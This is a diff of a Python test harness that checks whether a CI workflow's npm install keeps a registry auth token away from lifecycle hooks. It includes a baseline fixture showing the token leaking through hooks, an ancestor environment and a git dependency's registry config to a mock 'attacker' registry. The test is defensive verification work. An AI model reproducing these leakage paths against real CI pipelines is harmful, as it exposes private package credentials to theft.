+        assert all(
+            command in ("--version", "config get cache")
+            or command == f"cache add {private_registry.origin}{download_path}"
+            for command in credentialed
+        ), f"npm {version}: npm ran a non-fetch command with the credential: {credentialed}"
+        assert "ci --prefer-offline|absent" in trace, trace
+
+        # Without the workflow's boundary the same fixture leaks the credential
+        # through lifecycle hooks, an ancestor environment, and a git
+        # dependency's own registry config; the assertions above are not vacuous.
+        baseline_env = npm_environment(root, npm_bin, private_registry, "baseline")
+        attacker_registry.requests.clear()
         run(
-            [
-                "npm",
-                "install",
-                "--package-lock-only",
-                "--ignore-scripts",
-                "--offline",
-                "--no-audit",
-                "--no-fund",
-            ],
-            cwd=baseline_root,
-            env=baseline_env,
+            ["npm", "ci", "--no-audit", "--no-fund"],
+            cwd=baseline,
+            env=baseline_env | {"NODE_AUTH_TOKEN": TOKEN},
         )
-        run(
-            ["npm", "ci", "--offline", "--no-audit", "--no-fund"],
-            cwd=baseline_root,
-            env=baseline_env,
-        )
-        helper_hooks = Counter(":".join(record.split(":")[:2]) for record in records)
-        baseline_records = (root / "baseline-lifecycle.log").read_text().splitlines()
-        baseline_hooks = Counter(":".join(record.split(":")[:2]) for record in baseline_records)
-        required_dependency_hooks = {
-            f"{package_name}:dependency-{hook}"
-            for package_name in ("fixture-dependency", "fixture-transitive-dependency")
-            for hook in ("preinstall", "install", "postinstall", "prepare")
-        }
-        assert required_dependency_hooks <= baseline_hooks.keys(), (
-            f"baseline did not run explicitly approved dependency hooks: {required_dependency_hooks - baseline_hooks.keys()}"
-        )
-        assert helper_hooks == baseline_hooks, (
-            f"credentialless install changed npm ci lifecycle hooks: {helper_hooks!r} != {baseline_hooks!r}"
-        )
-        def hooks_by_package(hook_records):
-            hooks = {}
-            for record in hook_records:
-                package_name, hook = record.split(":", 2)[:2]
-                hooks.setdefault(package_name, []).append(hook)
-            return hooks
-
-        assert hooks_by_package(records) == hooks_by_package(baseline_records), (
-            "credentialless install changed lifecycle order within a package"
-        )
-        assert any(":synthetic-package-token:" in record for record in baseline_records), (
-            "baseline fixture must demonstrate the credential reaches npm ci lifecycle hooks"
+        baseline_records = Path(baseline_env["LIFECYCLE_LOG"]).read_text().splitlines()
+        assert any(f":{TOKEN}:" in record for record in baseline_records), baseline_records
+        assert any(json.loads(record.rsplit(":", 1)[-1]) for record in baseline_records), (
+            "baseline fixture must demonstrate lifecycle code can read an ancestor environment"
         )
         assert any(
-            json.loads(record.rsplit(":", 1)[-1]) for record in baseline_records
-        ), "baseline fixture must demonstrate lifecycle code can read an ancestor environment"
+            authorization == f"Bearer {TOKEN}" for _, authorization in attacker_registry.requests
+        ), f"npm {version}: baseline git dependency did not reach its own registry with the credential"
+        required_dependency_hooks = {
+            f"{package_name}:dependency-{hook}"
+            for package_name in ("fixture-dependency", "fixture-transitive-dependency", "git-dependency")
+            for hook in ("preinstall", "install", "postinstall", "prepare")
+        } | {
+            f"@fixture/private-dependency:dependency-{hook}"
+            for hook in ("preinstall", "install", "postinstall")
+        }
+        baseline_hooks = Counter(":".join(record.split(":")[:2]) for record in baseline_records)
+        assert required_dependency_hooks <= baseline_hooks.keys(), (
+            f"npm {version}: baseline skipped approved hooks: {required_dependency_hooks - baseline_hooks.keys()}"
+        )
+        helper_hooks = Counter(":".join(record.split(":")[:2]) for record in records)
+        assert helper_hooks == baseline_hooks, (
+            f"npm {version}: credentialless install changed lifecycle hooks: "
+            f"{helper_hooks!r} != {baseline_hooks!r}"
+        )
+        assert hooks_by_package(records) == hooks_by_package(baseline_records), (
+            f"npm {version}: credentialless install changed lifecycle order within a package"
+        )
+    finally:
+        private_registry.close()
+        attacker_registry.close()
 
+
+def verify_empty_dependency_tree(npm_bin, version, acquisition, install, root):
+    private_registry = FixtureRegistry(require_token=True)
+    try:
         empty_root = root / "empty-dependency-fixture"
         write_package(
             empty_root,
@@ -481,42 +754,31 @@ def main():
                     "postinstall": "node record-lifecycle.cjs empty-postinstall",
                 },
             },
-            lifecycle_recorder,
+            LIFECYCLE_RECORDER,
         )
-        (empty_root / ".npmrc").write_text(
-            "//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\n"
-        )
-        empty_env = env | {"LIFECYCLE_LOG": str(root / "empty-lifecycle.log")}
+        env = npm_environment(root, npm_bin, private_registry, "empty")
         run(
-            [
-                "npm",
-                "install",
-                "--package-lock-only",
-                "--ignore-scripts",
-                "--offline",
-                "--no-audit",
-                "--no-fund",
-            ],
+            ["npm", "install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"],
             cwd=empty_root,
-            env=empty_env,
+            env=env,
         )
-        empty_acquisition_env = empty_env | {
-            "PATH": f"{wrapper_dir}{os.pathsep}{empty_env['PATH']}",
-            "REAL_NPM": real_npm,
-            "NPM_TRACE": str(npm_trace),
+        runner_temp = root / "empty-runner-temp"
+        runner_temp.mkdir()
+        step_env = env | {
+            "GITHUB_WORKSPACE": str(empty_root),
+            "RUNNER_TEMP": str(runner_temp),
+            "PRIVATE_PACKAGE_REGISTRY": private_registry.origin,
         }
-        run(["npm", "ci", "--ignore-scripts"], cwd=empty_root, env=empty_acquisition_env)
-        empty_lifecycle_env = empty_acquisition_env.copy()
-        empty_lifecycle_env.pop("NODE_AUTH_TOKEN")
-        run(
-            ["npm", "ci", "--prefer-offline"],
-            cwd=empty_root,
-            env=empty_lifecycle_env,
-        )
-        empty_records = (root / "empty-lifecycle.log").read_text().splitlines()
-        assert empty_records == [
-            "empty-dependency-fixture:empty-postinstall:<unset>:[]:[]"
-        ], empty_records
+        acquired = run_step(acquisition, cwd=empty_root, env=step_env | {"NODE_AUTH_TOKEN": TOKEN})
+        assert acquired.returncode == 0, f"npm {version}: {acquired.stdout}{acquired.stderr}"
+        installed = run_step(install, cwd=empty_root, env=step_env | {"NODE_AUTH_TOKEN": ""})
+        assert installed.returncode == 0, f"npm {version}: {installed.stdout}{installed.stderr}"
+        assert private_registry.requests == []
+        records = Path(env["LIFECYCLE_LOG"]).read_text().splitlines()
+        assert records == ["empty-dependency-fixture:empty-postinstall:<unset>:[]:[]"], records
+    finally:
+        private_registry.close()
+
 
 if __name__ == "__main__":
     main()
